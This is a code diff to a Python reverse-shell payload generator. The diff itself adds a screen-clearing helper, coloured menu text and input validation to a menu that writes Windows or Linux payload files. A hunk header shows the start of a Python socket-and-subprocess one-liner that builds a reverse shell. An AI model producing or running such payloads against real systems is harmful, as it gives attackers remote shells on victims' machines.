@@ -1,6 +1,14 @@
 import string
 from random import randrange 
 import random
+from termcolor import colored
+import subprocess
+import time
+
+
+def clear_screen():
+    subprocess.run(["cls"], shell=True)
+
 
 def windows():
     print("""
@@ -78,17 +86,20 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
     print(f"Payload generated: {name}.pyw")
     
 def payloadSelection():
-    choices = input("""
-
-1) Windows Payload
+    clear_screen()
+    choices = input(colored("""1) Windows Payload
 2) Linux Payload
 
 
-
-Payload Selection Menu: """)
+Payload Selection Menu: """, "red"))
 
     if choices == "1":
         windows()
     elif choices == "2":
         linux()
+    else:
+        print("Please select using 1 or 2.")
+        time.sleep(2)
+        clear_screen()
+        payloadSelection()
 
